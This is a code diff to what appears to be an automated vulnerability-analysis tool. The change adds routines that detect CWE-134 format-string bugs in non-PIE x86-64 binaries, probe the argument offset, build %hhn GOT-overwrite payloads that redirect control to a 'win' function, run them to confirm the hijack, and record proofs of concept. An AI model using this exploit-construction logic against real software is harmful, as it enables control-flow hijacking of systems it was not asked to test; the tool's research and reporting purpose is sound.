@@ -361,13 +361,100 @@ def _already_exploited(conn, target) -> bool:
                for f in FindingDAO(conn).list_by_target(target.id))
 
 
+def _fmt_repro(target, layout: dict, plan: dict, win) -> str:
+    """The lightweight, operator-runnable deliverable (doc 58: a PoC is a script/payload + a few
+    lines, not a package). The exact payload bytes are the stored poc-input artifact; this says what
+    they do and how to fire them."""
+    name = getattr(target, "filename", None) or "./target"
+    writes = ", ".join(f"{a:#x} := {v:#x}" for a, v in (plan.get("writes") or {}).items())
+    winname = (win[0] if win else "the win function")
+    return (f"# CWE-134 format-string write-what-where ({plan['target_level']})\n"
+            f"# No PIE: every address is literal. arg_offset={layout.get('arg_offset')}, "
+            f"%hhn write(s): {writes}\n"
+            f"# The {len(plan['input'])}-byte payload is the attached poc-input artifact "
+            f"(save as poc.bin).\n"
+            f"{name} < poc.bin      # the next call through the overwritten GOT slot enters "
+            f"{winname}\n")
+
+
+def _construct_by_probe(ctx, target, ir, lead, fname: str, win, target_bytes: bytes):
+    """doc 58 fallback: when the static frame recovery cannot place the format buffer (e.g. the
+    decompiler symbolized the stack local, so the numeric offset is hidden) BUT the target can run
+    here, recover the arg offset with the %p probe, then CONFIRM a GOT-overwrite-to-win by
+    detonation. Returns a dict {payload, slot, got, off, win} on a confirmed hijack, else None.
+    x86-64 / no-PIE only; detonation makes it poc-backed, not merely constructed."""
+    if not (win and win[1]):
+        return None
+    from . import detonate, elfstatic, rop
+    try:
+        if elfstatic.is_pie(target_bytes):
+            return None
+        # stage into an EXEC-capable scratch dir -- the content store keeps artifacts non-exec
+        staged = ctx.scratch() / "fmt-construct" / (getattr(target, "filename", None) or "target.bin")
+        staged.parent.mkdir(parents=True, exist_ok=True)
+        ctx.content.stage_target(target, staged.parent, staged.name)
+        staged.chmod(0o755)
+        exe = str(staged)
+    except Exception:                                    # noqa: BLE001
+        return None
+    off = detonate.probe_fmt_offset(exe)                 # None if the target cannot run here
+    if off is None:
+        return None
+    try:
+        got = rop.got_entries(target_bytes)
+    except Exception:                                    # noqa: BLE001
+        got = {}
+    if not got:
+        return None
+    # candidate GOT slots: functions called after the sink first, then any import but the sink/sentinels
+    after = []
+    try:
+        site_i = lead.site_addr if isinstance(lead.site_addr, int) else int(str(lead.site_addr), 0)
+        instrs = x64frame.instructions(ir)
+        after = x64frame.calls_after(instrs, x64frame.site_index(instrs, site_i)) or []
+    except Exception:                                    # noqa: BLE001
+        after = []
+    ordered = [c for c in after if c in got and c not in _NOT_TARGET and c != fname]
+    ordered += [g for g in got if g not in ordered and g not in _NOT_TARGET and g != fname]
+    win_vaddr = int(win[1])
+    for slot in ordered:
+        try:
+            payload = fmt.fmtstr_payload(off, {got[slot]: win_vaddr}, nbytes=6)
+        except Exception:                                # noqa: BLE001
+            continue
+        if detonate.reaches_address(exe, payload, win_vaddr, input_mode="stdin"):
+            return {"payload": payload, "slot": slot, "got": got[slot], "off": off, "win": win}
+    return None
+
+
+def _try_detonate(ctx, target, plan: dict, win):
+    """Best-effort bonus confirmation: if the target can run here, verify control reaches the win
+    address when the payload is delivered -> (True, signal). Never required; a sound construction
+    stands on its argument alone. Returns (False, None) when the target cannot run or the oracle
+    is unavailable -- the reached-address oracle is wired in the next step."""
+    try:
+        from . import detonate
+    except Exception:                                    # noqa: BLE001
+        return (False, None)
+    try:
+        win_vaddr = int(win[1]) if win and win[1] else None
+        if win_vaddr is None or not plan.get("input"):
+            return (False, None)
+        exe = ctx.content.path(target.sha256)
+        if detonate.reaches_address(str(exe), bytes(plan["input"]), win_vaddr, input_mode="stdin"):
+            return (True, f"control reached {win[0]} ({win_vaddr:#x})")
+    except Exception:                                    # noqa: BLE001
+        observe.absorbed(_log, "fmt detonation skipped")
+    return (False, None)
+
+
 def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[bytes] = None,
                               max_sites: int = 3) -> list:
     """For each CWE-134 lead with a recoverable site, compute the %hhn plan and file it as a
     corroborated recipe carrying the payload bytes. Returns the filed finding ids ([] when there is
     no CWE-134 lead, the target is not x86-64, or a format exploit is already demonstrated).
     Never raises."""
-    from . import exploit, recipe
+    from . import construct, exploit, recipe
     fids = []
     try:
         if not _x86_64(target) or _already_exploited(ctx.conn, target):
@@ -399,10 +486,71 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
             # leak. Best-effort, keyed to the site; never blocks the recipe below.
             if layout:
                 _emit_format_script(ctx, target, target_bytes, layout, plan, name)
+            # doc 58: if the static construction isn't a complete one-shot but the target RUNS,
+            # recover the offset by probe and CONFIRM a GOT-overwrite-to-win by detonation.
+            if not (plan and plan.get("stage") == "one-shot"):
+                dyn = _construct_by_probe(ctx, target, ir, lead, name, win, target_bytes)
+                if dyn:
+                    done += 1
+                    try:
+                        s = f"{int(str(lead.site_addr), 0):#x}"
+                    except (ValueError, TypeError):
+                        s = str(lead.site_addr)
+                    fid = construct.record_constructed_poc(
+                        ctx, target, cwe="CWE-134",
+                        technique=f"format-string %hhn GOT overwrite ({dyn['slot']}@GOT := {win[0]})",
+                        level="L3", payload=dyn["payload"],
+                        soundness=[
+                            f"{name}(buf) at {s}: a run-time buffer is the format with zero format "
+                            "arguments (the CWE-134 shape)",
+                            f"arg offset {dyn['off']} recovered by %p probe (the 0x41.. marker "
+                            f"printed at that varargs position)",
+                            f"no PIE: {dyn['slot']}@GOT is at the fixed address {dyn['got']:#x}",
+                            f"%hhn write {dyn['slot']}@GOT := &{win[0]} ({int(win[1]):#x})",
+                            f"DETONATED: control reached {win[0]} ({int(win[1]):#x}) under the "
+                            "payload; benign input does not",
+                        ],
+                        reproduce=(f"# CWE-134 format-string GOT overwrite -> {win[0]} (L3)\n"
+                                   f"# {dyn['slot']}@GOT({dyn['got']:#x}) := &{win[0]}"
+                                   f"({int(win[1]):#x}) via %hhn at arg offset {dyn['off']}.\n"
+                                   f"# payload is the attached poc-input artifact ({len(dyn['payload'])} "
+                                   f"bytes); save as poc.bin\n"
+                                   f"{getattr(target,'filename',None) or './target'} < poc.bin"),
+                        input_mode="stdin", detector="fmt_construct",
+                        dedup_key=f"poc:CWE-134:fmt-write:{s}:{target.id}",
+                        title=f"Format-string write-what-where at {s}",
+                        summary=f"{name}(buf) at {s}: %hhn-write &{win[0]} over {dyn['slot']}@GOT "
+                                f"({dyn['got']:#x}); control reach to {win[0]} confirmed by detonation",
+                        lead=lead, detonated=True,
+                        signal_name=f"control reached {win[0]} ({int(win[1]):#x})")
+                    if fid:
+                        fids.append(fid)
+                    continue
             if not plan:
                 continue
             done += 1
             site = f"{layout['site']:#x}"
+            # doc 58: the one-shot branch is a COMPLETE construction -- every fact is literal (no
+            # PIE so the GOT slot is absolute, the arg offset is the recovered frame, a GOT slot
+            # called after the sink). That is a PoC, not a recipe: file it as a CONFIRMED,
+            # constructed PoC carrying the payload + a lightweight repro. The probe/two-stage
+            # branches rest on an unproven fact (an offset to probe, a base to leak) and stay
+            # honest corroborated recipes below.
+            if plan.get("stage") == "one-shot" and plan.get("input"):
+                detonated, signal_name = _try_detonate(ctx, target, plan, win)
+                fid = construct.record_constructed_poc(
+                    ctx, target, cwe="CWE-134", technique=plan["technique"],
+                    level=plan["target_level"], payload=plan["input"],
+                    soundness=list(plan["assumptions"]),
+                    reproduce=_fmt_repro(target, layout, plan, win),
+                    input_mode="stdin", detector="fmt_construct",
+                    dedup_key=f"poc:CWE-134:fmt-write:{site}:{target.id}",
+                    title=f"Format-string write-what-where at {site}",
+                    summary=plan["summary"], lead=lead,
+                    detonated=detonated, signal_name=signal_name)
+                if fid:
+                    fids.append(fid)
+                continue
             extra = [{"channel": "recipe-assumptions",
                       "detail": "; ".join(plan["assumptions"])}]
             if plan.get("writes"):
